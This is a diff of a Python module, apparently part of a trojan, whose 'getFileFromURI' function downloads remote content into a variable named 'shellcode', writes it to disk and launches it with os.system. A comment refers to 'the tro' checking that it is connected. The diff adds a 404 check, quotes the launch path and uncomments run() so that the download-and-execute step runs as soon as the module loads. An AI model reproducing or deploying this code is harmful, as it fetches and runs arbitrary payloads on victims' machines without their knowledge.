@@ -60,12 +60,15 @@ def run(**args):
         r = http.request('GET', url)
         #The data attribute of the response is always set to a byte string representing the response content
         shellcode = r.data
+        #print(r.status)
     except urllib3.exceptions.MaxRetryError:
     	#os.system("echo 'getFileFromURI: HTTP Error 404: File not found' >> .Tlog.log")
     	return "getFileFromURI: HTTP Error 404: File not found"
     except urllib3.exceptions.URLError:
     	#os.system("echo '<urlopen error [Errno 111] Connection refused>' >> .Tlog.log")
     	return "getFileFromURI: Connection refused"
+    if r.status == 404:
+        return "getFileFromURI: HTTP Error 404: File not found"
 
     try:
         mon_fichier = open(OsTargetpath, "wb")
@@ -77,7 +80,7 @@ def run(**args):
 
     if start and os.name == 'nt': #TODO: check how to start python script
         if bin:
-            os.system("start {}".format(OsTargetpath.replace('/','\\')))
+            os.system("start '{}'".format(OsTargetpath.replace('/','\\')))
         else:
             os.system(scriptExec+" "+OsTargetpath)
     elif start and os.name == 'posix':
@@ -90,7 +93,7 @@ def run(**args):
     return str("getFileFromURI: file {} successfully started".format(OsTargetpath))
 
 
-#run()
+run()
   #while not is_connected(): #if the tro execute this, so it is already connected
   #time.sleep(20)
 import socket
